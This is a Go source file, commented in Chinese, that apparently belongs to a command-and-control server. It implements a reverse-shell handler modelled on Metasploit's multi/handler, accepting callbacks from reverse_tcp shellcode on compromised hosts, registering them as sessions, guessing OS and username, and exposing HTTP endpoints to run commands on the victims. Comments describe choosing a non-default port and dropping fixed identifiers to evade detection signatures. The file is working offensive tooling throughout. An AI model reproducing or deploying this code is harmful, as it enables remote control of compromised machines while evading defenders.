package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ============ Raw TCP Shell Handler（参考 MSF multi/handler）============
// 监听独立 TCP 端口（shell_listen_port，默认 4444），接受 reverse_tcp shellcode 回连
// 连接建立后注册为 client_type='shell' 的会话，在主机管理可见
// 命令执行: /api/shell/<client_id>/exec 同步写入 conn + 超时读取输出（与 webshell 模式一致）
// 连接断开: 自动标记 offline + session_state='dead'

// shellSession 单个 shell 会话
type shellSession struct {
	conn   net.Conn
	mu     sync.Mutex // 互斥执行命令，防止并发写入混乱
	closed bool
}

// shellConns 所有活跃的 shell 会话（key=client_id）
var (
	shellConns   = map[string]*shellSession{}
	shellConnsMu sync.RWMutex
)

// getShellListenPort 获取 shell TCP 监听端口（默认 44330，避开 MSF 默认 4444 特征）
func getShellListenPort() string {
	return getSettingDefault("shell_listen_port", "44330")
}

// startShellListener 启动 raw TCP shell 监听器
// 接受 reverse_tcp/bind_tcp shellcode 的回连，注册为 shell 类型会话
func startShellListener(port string) {
	if port == "" {
		port = "44330"
	}
	addr := "0.0.0.0:" + port
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Printf("[WARN] Shell TCP 监听 %s 失败: %v\n", addr, err)
		fmt.Printf("[INFO] shellcode reverse_tcp 无法回连到本 C2，请检查端口占用或权限\n")
		return
	}
	fmt.Printf("[OK] Shell TCP Handler 监听于 %s（reverse_tcp/bind_tcp 回连端口）\n", addr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				// 监听器关闭
				return
			}
			go handleShellConn(conn)
		}
	}()
}

// handleShellConn 处理新的 shell 回连
// 生成 client_id，注册到 clients 表，加入 shellConns map
func handleShellConn(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	// 生成 client_id: md5(remoteAddr + timestamp)[:16]，无固定前缀
	hash := md5.Sum([]byte(remoteAddr + time.Now().String()))
	clientID := hex.EncodeToString(hash[:])[:16]
	sessionID := genSessionID(clientID)

	// 探测目标系统类型（通过读取首个 banner，部分 shell 会输出欢迎信息）
	// 设置短超时读取 banner，超时不报错（很多 shell 不输出 banner）
	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	banner := make([]byte, 1024)
	n, _ := conn.Read(banner)
	conn.SetReadDeadline(time.Time{})
	bannerStr := ""
	if n > 0 {
		bannerStr = string(banner[:n])
	}

	// 从 banner 猜测 OS（简单启发式）
	osGuess := "unknown"
	archGuess := "x64"
	if strings.Contains(strings.ToLower(bannerStr), "microsoft") || strings.Contains(bannerStr, "C:\\") || strings.Contains(bannerStr, "PS ") {
		osGuess = "windows"
	} else if strings.Contains(bannerStr, "$") || strings.Contains(bannerStr, "#") || strings.Contains(strings.ToLower(bannerStr), "linux") || strings.Contains(bannerStr, "/") {
		osGuess = "linux"
	}

	// 注册到 clients 表（hostname/username 不用固定前缀，避免特征）
	ip, _, _ := net.SplitHostPort(remoteAddr)
	hostname := ip // 直接用 IP 作 hostname，无固定前缀
	username := "unknown"
	if bannerStr != "" {
		// 尝试从 banner 提取用户名（如 cmd 的 C:\Users\xxx>）
		if idx := strings.Index(bannerStr, "Users\\"); idx >= 0 {
			rest := bannerStr[idx+6:]
			end := strings.IndexAny(rest, "\\>")
			if end > 0 {
				username = rest[:end]
			}
		} else if idx := strings.Index(bannerStr, "home/"); idx >= 0 {
			rest := bannerStr[idx+5:]
			end := strings.IndexAny(rest, "/:$")
			if end > 0 {
				username = rest[:end]
			}
		}
	}
	dbExec(`INSERT INTO clients
		(client_id, hostname, os, os_version, arch, username, ip, status, group_name,
		 session_id, session_state, session_started, client_type)
		VALUES (?, ?, ?, ?, ?, ?, ?, 'online', 'default', ?, 'active', ?, 'shell')`,
		clientID, hostname, osGuess, "", archGuess, username, ip, sessionID, nowLocal())

	addLog("shell", fmt.Sprintf("新 Shell 上线: %s (%s) from %s", clientID, sessionID, remoteAddr), clientID, 0, ip)
	broadcastClientUpdate()

	// 存入 map
	sess := &shellSession{conn: conn}
	shellConnsMu.Lock()
	shellConns[clientID] = sess
	shellConnsMu.Unlock()

	// 如果有 banner，作为初始输出广播
	if bannerStr != "" {
		broadcastShellOutput(sessionID, clientID, bannerStr)
	}

	// 不启动持续读循环，避免与 exec 的 Read 竞争同一 conn
	// 断开检测: exec 命令执行时如果收到连接错误，自动标记 offline + dead
}

// shellDisconnect 清理断开的 shell 会话
func shellDisconnect(clientID, sessionID string, sess *shellSession) {
	shellConnsMu.Lock()
	delete(shellConns, clientID)
	shellConnsMu.Unlock()
	sess.mu.Lock()
	sess.closed = true
	sess.conn.Close()
	sess.mu.Unlock()

	dbExec("UPDATE clients SET status='offline', session_state='dead' WHERE client_id=?", clientID)
	broadcastClientUpdate()
	addLog("shell", fmt.Sprintf("Shell 断开: %s", clientID), clientID, 0, "")
}

// broadcastShellOutput 广播 shell 输出到前端 WebSocket
// 前端收到 shell_output 事件后，按 session_id 路由到对应终端组件
func broadcastShellOutput(sessionID, clientID, data string) {
	broadcastJSON(map[string]interface{}{
		"event":      "shell_output",
		"session_id": sessionID,
		"client_id":  clientID,
		"data":       data,
	})
}

// ============ Shell 命令执行 API ============

// handleShellExec 执行 shell 命令（同步模式，与 webshell exec 对齐）
// POST /api/shell/<client_id>/exec
// body: {"command":"whoami","timeout":5}
// 返回: {"success":true,"result":"...","task_id":N,"status":"completed"}
func handleShellExec(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")

	client, _ := queryOne("SELECT * FROM clients WHERE client_id=?", clientID)
	if client == nil {
		jsonError(w, "Shell 会话不存在", http.StatusNotFound)
		return
	}
	if getString(client, "client_type", "") != "shell" {
		jsonError(w, "非 Shell 类型客户端", http.StatusBadRequest)
		return
	}

	var data struct {
		Command string `json:"command"`
		Timeout int    `json:"timeout"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if data.Command == "" {
		jsonError(w, "command 不能为空", http.StatusBadRequest)
		return
	}
	if data.Timeout <= 0 {
		data.Timeout = 5
	}
	if data.Timeout > 60 {
		data.Timeout = 60
	}

	sessionID := getString(client, "session_id", "")

	// 创建 task 记录（审计轨迹）
	tid, _ := dbExec("INSERT INTO tasks (client_id, task_type, task_data, status, created_at) VALUES (?, 'cmd', ?, 'processing', ?)",
		clientID, data.Command, nowLocal())
	broadcastTaskUpdate()

	// 执行命令
	result, status := shellExecCommand(clientID, sessionID, data.Command, data.Timeout)

	// 更新 task 记录
	dbExec("UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?", status, result, nowLocal(), tid)
	// 更新 last_seen
	dbExec("UPDATE clients SET last_seen=?, status='online' WHERE client_id=?", nowLocal(), clientID)
	broadcastTaskUpdate()

	addLog("shell", fmt.Sprintf("Shell 执行: %s (%s)", data.Command, clientID), clientID, user.UserID, getRequestIP(r))

	jsonOK(w, map[string]interface{}{
		"success": true,
		"status":  status,
		"result":  result,
		"task_id": tid,
	})
}

// shellExecCommand 向 shell conn 写入命令并读取输出
// 策略: 写命令+换行 → 设置读超时 → 循环读取直到超时（300ms 无新数据则认为命令完成）
// 连接错误时自动调用 shellDisconnect 清理会话
func shellExecCommand(clientID, sessionID, cmd string, timeoutSec int) (string, string) {
	shellConnsMu.RLock()
	sess, ok := shellConns[clientID]
	shellConnsMu.RUnlock()
	if !ok {
		return "[ERROR] Shell 会话已断开", "failed"
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()

	if sess.closed {
		return "[ERROR] Shell 连接已关闭", "failed"
	}

	// 写入命令（+换行）
	_, err := sess.conn.Write([]byte(cmd + "\n"))
	if err != nil {
		// 写入失败 = 连接断开
		go shellDisconnect(clientID, sessionID, sess)
		return fmt.Sprintf("[ERROR] 写入失败: %s", err.Error()), "failed"
	}

	// 读取输出（带超时）
	// 总超时: timeoutSec 秒
	// 单次读超时: 300ms（无新数据则认为命令执行完）
	deadline := time.Now().Add(time.Duration(timeoutSec) * time.Second)
	var sb strings.Builder
	tmp := make([]byte, 4096)

	for time.Now().Before(deadline) {
		// 设置短读超时，检测是否还有数据
		sess.conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := sess.conn.Read(tmp)
		if n > 0 {
			sb.Write(tmp[:n])
		}
		// 清除 deadline
		sess.conn.SetReadDeadline(time.Time{})

		if err != nil {
			// 超时（无更多数据）或连接错误
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// 300ms 无新数据，认为命令执行完
				if sb.Len() > 0 {
					break
				}
				// 还没读到任何数据，继续等
				continue
			}
			// 连接错误 = 断开
			go shellDisconnect(clientID, sessionID, sess)
			return fmt.Sprintf("[ERROR] 读取失败: %s", err.Error()), "failed"
		}
	}

	result := sb.String()
	if result == "" {
		result = "(无输出)"
	}

	// 去除回显的命令行本身（首行通常包含输入的命令）
	// raw shell 会回显输入，去掉首行如果包含命令
	lines := strings.SplitN(result, "\n", 2)
	if len(lines) > 1 && strings.Contains(lines[0], cmd) {
		result = strings.TrimPrefix(result, lines[0]+"\n")
	}

	return result, "completed"
}

// handleShellInput 实时输入（用于前端终端实时交互模式）
// POST /api/shell/<client_id>/input
// body: {"data":"ls -la\n"}
// 不返回结果，输出通过 WebSocket shell_output 事件推送
func handleShellInput(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")

	var data struct {
		Data string `json:"data"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	shellConnsMu.RLock()
	sess, ok := shellConns[clientID]
	shellConnsMu.RUnlock()
	if !ok {
		jsonError(w, "Shell 会话已断开", http.StatusNotFound)
		return
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()

	if sess.closed {
		jsonError(w, "Shell 连接已关闭", http.StatusBadRequest)
		return
	}

	_, err := sess.conn.Write([]byte(data.Data))
	if err != nil {
		jsonError(w, "写入失败: "+err.Error(), http.StatusInternalServerError)
		return
	}

	jsonOK(w, map[string]interface{}{"success": true})
}

// handleShellKill 关闭 shell 会话
// POST /api/shell/<client_id>/kill
func handleShellKill(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")

	shellConnsMu.Lock()
	sess, ok := shellConns[clientID]
	if ok {
		sess.mu.Lock()
		sess.closed = true
		sess.conn.Close()
		sess.mu.Unlock()
		delete(shellConns, clientID)
	}
	shellConnsMu.Unlock()

	// 更新数据库
	dbExec("UPDATE clients SET status='offline', session_state='dead' WHERE client_id=?", clientID)
	broadcastClientUpdate()

	addLog("shell", fmt.Sprintf("Shell 会话关闭: %s", clientID), clientID, user.UserID, getRequestIP(r))

	jsonOK(w, map[string]interface{}{"success": true})
}

// isShellConnected 检查 shell 会话是否仍然连接
func isShellConnected(clientID string) bool {
	shellConnsMu.RLock()
	_, ok := shellConns[clientID]
	shellConnsMu.RUnlock()
	return ok
}

// scanShellOutput 辅助: 用 bufio 扫描 shell 输出行（用于调试）
func scanShellOutput(data string) []string {
	var lines []string
	scanner := bufio.NewScanner(strings.NewReader(data))
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}
